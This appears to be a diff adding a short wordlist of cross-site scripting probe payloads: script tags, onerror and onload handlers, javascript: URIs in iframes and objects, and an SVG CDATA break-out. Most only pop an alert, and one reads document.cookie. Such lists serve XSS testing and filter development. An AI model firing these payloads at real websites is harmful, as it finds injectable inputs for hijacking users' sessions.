@@ -1,0 +1,12 @@
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<script>document.write(1)</script>
+"><svg/onload=alert(1)>
+'"><img src=x onerror=alert(document.cookie)>
+"><script>alert('XSS')</script>
+'"><script>alert('test')</script>
+"><svg onload=alert(1)>
+'"><iframe src="javascript:alert('XSS')"></iframe>
+'"><object data="javascript:alert('XSS')"></object>
+<svg><desc><![CDATA[]]>]]></desc><script>alert(1)</script></svg>
+<iframe src="javascript:alert(1)">
